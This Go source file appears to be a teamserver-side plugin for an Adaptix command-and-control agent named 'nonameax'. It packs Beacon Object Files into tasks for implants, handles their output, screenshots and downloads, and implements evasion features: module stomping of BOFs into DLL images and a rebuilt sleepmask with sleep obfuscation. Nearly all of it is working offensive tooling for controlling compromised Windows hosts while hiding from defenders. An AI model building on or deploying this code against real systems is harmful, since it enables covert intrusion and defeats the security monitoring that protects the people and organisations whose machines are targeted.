package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
)

func stompLabel(status byte, slotIdx byte) string {
	if status == 0x01 {
		if slotIdx == 0xFF {
			return "[stomp: image-backed (sync)]"
		}
		return fmt.Sprintf("[stomp: image-backed (async slot %d)]", slotIdx)
	}
	return "[stomp: private fallback]"
}

func parseBofOutput(ts adaptix.Teamserver, agentId int64, data []byte) (string, string) {
	var displayParts []string
	clearText := ""
	off := 0
	for off < len(data) {
		switch data[off] {
		case CALLBACK_SCREENSHOT:
			dt, _, n := handleScreenshotResult(ts, agentId, data[off:])
			displayParts = append(displayParts, dt)
			off += n
		case CALLBACK_DOWNLOAD:
			dt, _, n := handleDownloadResult(ts, agentId, data[off:])
			displayParts = append(displayParts, dt)
			off += n
		case 0x00:
			if off+5 <= len(data) {
				tLen := int(binary.LittleEndian.Uint32(data[off+1 : off+5]))
				if off+5+tLen <= len(data) {
					clearText = string(data[off+5 : off+5+tLen])
					displayParts = append(displayParts, fmt.Sprintf("BOF output (%d bytes)", tLen))
					off += 5 + tLen
				} else {
					clearText = string(data[off+5:])
					off = len(data)
				}
			} else {
				off = len(data)
			}
		default:
			clearText = string(data[off:])
			displayParts = append(displayParts, fmt.Sprintf("BOF output (%d bytes)", len(data)-off))
			off = len(data)
		}
	}
	displayText := ""
	if len(displayParts) > 0 {
		displayText = strings.Join(displayParts, "\n")
	}
	return displayText, clearText
}

func cmdBof(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	bofBytes, bofErr := adaptix.GetFileArg(args, "file")
	if bofErr != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: bof: %w", bofErr)
	}
	if len(bofBytes) < 20 {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: bof: file too small to be a valid COFF")
	}
	argSpec := adaptix.GetStringArgDefault(args, "args", "")
	packedArgs, packErr := packBofArgs(argSpec)
	if packErr != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: bof: args pack: %w", packErr)
	}
	// Wire v2: cmd_id(1) | args_len(4LE) | async(1) | timeout(4LE) | bof_size(4LE) | bof | args_size(4LE) | args
	bofSize := len(bofBytes)
	argsSize := len(packedArgs)
	innerLen := 1 + 4 + 4 + bofSize + 4 + argsSize
	data := make([]byte, 5+innerLen)
	data[0] = CMD_BOF
	binary.LittleEndian.PutUint32(data[1:5], uint32(innerLen))
	data[5] = 0 // sync
	binary.LittleEndian.PutUint32(data[6:10], 0)
	binary.LittleEndian.PutUint32(data[10:14], uint32(bofSize))
	copy(data[14:14+bofSize], bofBytes)
	binary.LittleEndian.PutUint32(data[14+bofSize:18+bofSize], uint32(argsSize))
	if argsSize > 0 {
		copy(data[18+bofSize:], packedArgs)
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("bof queued (%d bytes COFF)", bofSize)}
	return task, msg, nil
}

func cmdExecute(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	subcommand := adaptix.GetStringArgDefault(args, "subcommand", "")
	if subcommand != "bof" {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: execute: unsupported subcommand %q", subcommand)
	}

	bofBytes, bofErr := adaptix.GetFileArg(args, "bof_file")
	if bofErr != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: execute bof: %w", bofErr)
	}
	if len(bofBytes) < 20 {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			errors.New("nonameax: execute bof: file too small to be a valid COFF")
	}

	var packedArgs []byte
	if paramData, pdErr := adaptix.GetFileArg(args, "param_data"); pdErr == nil {
		packedArgs = paramData
	}

	asyncFlag := byte(0)
	if adaptix.GetBoolArg(args, "-a") {
		asyncFlag = 1
	}
	timeoutSecs := uint32(adaptix.GetFloatArgDefault(args, "timeout", 0))

	bofSize := len(bofBytes)
	argsSize := len(packedArgs)
	innerLen := 1 + 4 + 4 + bofSize + 4 + argsSize
	data := make([]byte, 5+innerLen)
	data[0] = CMD_BOF
	binary.LittleEndian.PutUint32(data[1:5], uint32(innerLen))
	data[5] = asyncFlag
	binary.LittleEndian.PutUint32(data[6:10], timeoutSecs)
	binary.LittleEndian.PutUint32(data[10:14], uint32(bofSize))
	copy(data[14:14+bofSize], bofBytes)
	binary.LittleEndian.PutUint32(data[14+bofSize:18+bofSize], uint32(argsSize))
	if argsSize > 0 {
		copy(data[18+bofSize:], packedArgs)
	}

	mode := "sync"
	if asyncFlag == 1 {
		mode = "async"
	}
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{
		Status:  messageSeverityInfo,
		Message: fmt.Sprintf("execute bof queued [%s] (%d bytes COFF, %d bytes args)", mode, bofSize, argsSize),
	}
	return task, msg, nil
}

func cmdBofStomp(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	subcommand := adaptix.GetStringArgDefault(args, "subcommand", "")
	switch subcommand {
	case "sync":
		dll := adaptix.GetStringArgDefault(args, "dll", "")
		if dll == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: bof-stomp sync: 'dll' argument required")
		}
		doUnload := adaptix.GetBoolArg(args, "-unload")
		wchars := utf16LEEncode(dll)
		// sub_cmd(1)=0x00 | wchar_len(4LE) | wchar_bytes | flags(1)
		argsLen := 1 + 4 + len(wchars) + 1
		data := make([]byte, 5+argsLen)
		data[0] = CMD_BOF_STOMP
		binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
		data[5] = 0x00
		binary.LittleEndian.PutUint32(data[6:10], uint32(len(wchars)))
		copy(data[10:], wchars)
		if doUnload {
			data[10+len(wchars)] = 0x01
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("bof-stomp sync %s queued", dll)}
		return task, msg, nil

	case "async":
		dllsStr := adaptix.GetStringArgDefault(args, "dlls", "")
		if dllsStr == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: bof-stomp async: 'dlls' argument required")
		}
		doUnload := adaptix.GetBoolArg(args, "-unload")
		dlls := strings.Split(dllsStr, ",")
		if len(dlls) > 4 {
			dlls = dlls[:4]
		}
		// sub_cmd(1)=0x01 | count(1) | [wchar_len(4LE) | wchar_bytes]... | flags(1)
		var payload []byte
		payload = append(payload, 0x01, byte(len(dlls)))
		for _, d := range dlls {
			d = strings.TrimSpace(d)
			wchars := utf16LEEncode(d)
			var lenBuf [4]byte
			binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(wchars)))
			payload = append(payload, lenBuf[:]...)
			payload = append(payload, wchars...)
		}
		var flags byte
		if doUnload {
			flags = 0x01
		}
		payload = append(payload, flags)
		data := make([]byte, 5+len(payload))
		data[0] = CMD_BOF_STOMP
		binary.LittleEndian.PutUint32(data[1:5], uint32(len(payload)))
		copy(data[5:], payload)
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("bof-stomp async [%s] queued", dllsStr)}
		return task, msg, nil

	case "show":
		data := make([]byte, 6)
		data[0] = CMD_BOF_STOMP
		binary.LittleEndian.PutUint32(data[1:5], 1)
		data[5] = 0x02
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: "bof-stomp show queued"}
		return task, msg, nil

	case "sleepmask":
		dll := adaptix.GetStringArgDefault(args, "dll", "")
		if dll == "" {
			return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
				errors.New("nonameax: bof-stomp sleepmask: 'dll' argument required")
		}
		doUnload := adaptix.GetBoolArg(args, "-unload")
		wchars := utf16LEEncode(dll)
		// sub_cmd(1)=0x03 | wchar_len(4LE) | wchar_bytes | flags(1)
		argsLen := 1 + 4 + len(wchars) + 1
		data := make([]byte, 5+argsLen)
		data[0] = CMD_BOF_STOMP
		binary.LittleEndian.PutUint32(data[1:5], uint32(argsLen))
		data[5] = 0x03
		binary.LittleEndian.PutUint32(data[6:10], uint32(len(wchars)))
		copy(data[10:], wchars)
		if doUnload {
			data[10+len(wchars)] = 0x01
		}
		task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
		msg := adaptix.ConsoleMessageData{Status: messageSeverityInfo, Message: fmt.Sprintf("bof-stomp sleepmask %s queued", dll)}
		return task, msg, nil

	default:
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: bof-stomp: unknown subcommand %q", subcommand)
	}
}

func cmdSleepmaskSet(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	naxRoot := resolveNaxRoot()
	smDir := filepath.Join(naxRoot, "src_sleepmask")
	smPath := filepath.Join(smDir, "dist", "sleepmask.x64.o")

	smTarget := "all"
	if adaptix.GetBoolArg(args, "-debug") {
		smTarget = "debug"
	}

	cleanCmd := exec.Command("make", "-C", smDir, "clean")
	cleanCmd.CombinedOutput()
	buildCmd := exec.Command("make", "-C", smDir, smTarget)
	if smOut, smErr := buildCmd.CombinedOutput(); smErr != nil {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: sleepmask build failed: %v\n%s", smErr, string(smOut))
	}

	smBytes, err := os.ReadFile(smPath)
	if err != nil || len(smBytes) == 0 {
		return adaptix.TaskData{}, adaptix.ConsoleMessageData{},
			fmt.Errorf("nonameax: sleepmask BOF not found at %s", smPath)
	}
	sleepmaskBofCache = smBytes

	argsLen := 4 + len(smBytes)
	buf := make([]byte, 5+argsLen)
	buf[0] = CMD_SLEEPMASK_SET
	binary.LittleEndian.PutUint32(buf[1:5], uint32(argsLen))
	binary.LittleEndian.PutUint32(buf[5:9], uint32(len(smBytes)))
	copy(buf[9:], smBytes)
	taskData := adaptix.TaskData{Type: taskTypeTask, Data: buf, Sync: true}
	msg := adaptix.ConsoleMessageData{
		Status:  messageSeverityInfo,
		Message: fmt.Sprintf("Sending sleepmask BOF (%d bytes, rebuilt from source)", len(smBytes)),
	}
	return taskData, msg, nil
}

func cmdSleepobfConfig(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	sleepObfStr := adaptix.GetStringArgDefault(args, "sleep_obf", "")

	var sleepObf byte
	switch strings.ToLower(sleepObfStr) {
	case "1", "on", "true":
		sleepObf = 1
	}

	// cmd_id(1) | args_len(4LE)=2 | sleep_obf(1) | pad(1)
	data := make([]byte, 7)
	data[0] = CMD_SLEEPOBF_CONFIG
	binary.LittleEndian.PutUint32(data[1:5], 2)
	data[5] = sleepObf
	data[6] = 0

	obfName := map[byte]string{0: "off", 1: "on"}[sleepObf]
	task := adaptix.TaskData{Type: taskTypeTask, Data: data, Sync: true}
	msg := adaptix.ConsoleMessageData{
		Status:  messageSeverityInfo,
		Message: fmt.Sprintf("sleepobf-config: sleep_obf=%s", obfName),
	}
	return task, msg, nil
}

func resultBofAsync(agentData adaptix.AgentData, taskIdInt int64) {
	activeJobs.Store(taskIdInt, true)
	task := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_JOB,
		AgentId:     agentData.Id,
		TaskId:      taskIdInt,
		Completed:   false,
		Sync:        true,
		MessageType: messageSeverityInfo,
		Message:     "BOF queued for async execution",
	}
	if Ts != nil {
		Ts.TsTaskUpdate(agentData.Id, task)
	}
}

func resultBofSync(agentData adaptix.AgentData, status byte, cmdId byte, data []byte) (string, string) {
	if status == STATUS_OK && len(data) > 0 {
		bofStompLabel := ""
		parseData := data
		if len(data) >= 2 {
			bofStompLabel = stompLabel(data[0], data[1])
			parseData = data[2:]
		}
		displayText, clearText := parseBofOutput(Ts, agentData.Id, parseData)
		if displayText == "" {
			displayText = fmt.Sprintf("BOF output (%d bytes)", len(parseData))
		}
		if bofStompLabel != "" {
			displayText += "\n" + bofStompLabel
		}
		return displayText, clearText
	} else if status == STATUS_OK {
		switch cmdId {
		case CMD_SCREENSHOT:
			return "screenshot failed (no data)", ""
		default:
			return "BOF completed (no output)", ""
		}
	}
	return string(data), ""
}

func resultJobOutput(agentData adaptix.AgentData, taskIdInt int64, status byte, data []byte) {
	bofStompLabel := ""
	parseData := data
	if (status == JOB_COMPLETE || status == JOB_KILLED) && len(data) >= 2 {
		bofStompLabel = stompLabel(data[0], data[1])
		parseData = data[2:]
	}
	jobDisplay, jobClear := parseBofOutput(Ts, agentData.Id, parseData)
	task := adaptix.TaskData{
		Type:    adaptix.TASK_TYPE_JOB,
		AgentId: agentData.Id,
		TaskId:  taskIdInt,
		Sync:    true,
	}
	switch status {
	case JOB_OUTPUT:
		task.Completed = false
		task.MessageType = messageSeverityInfo
		task.Message = "BOF output"
		task.ClearText = jobClear
		if jobDisplay != "" && jobClear == "" {
			task.Message = jobDisplay
		}
	case JOB_COMPLETE:
		activeJobs.Delete(taskIdInt)
		task.Completed = true
		task.FinishDate = time.Now().Unix()
		task.MessageType = messageSeveritySuccess
		task.Message = "BOF completed"
		task.ClearText = jobClear
		if jobDisplay != "" && jobClear == "" {
			task.Message = jobDisplay
		}
		if bofStompLabel != "" {
			task.Message += "\n" + bofStompLabel
		}
	case JOB_KILLED:
		activeJobs.Delete(taskIdInt)
		task.Completed = true
		task.FinishDate = time.Now().Unix()
		task.MessageType = messageSeverityError
		task.Message = "BOF killed by watchdog/operator"
		if bofStompLabel != "" {
			task.Message += "\n" + bofStompLabel
		}
	default:
		task.Completed = false
		task.MessageType = messageSeverityInfo
		task.Message = fmt.Sprintf("Job status=%d", status)
		task.ClearText = jobClear
	}
	if Ts != nil {
		Ts.TsTaskUpdate(agentData.Id, task)
	}
}
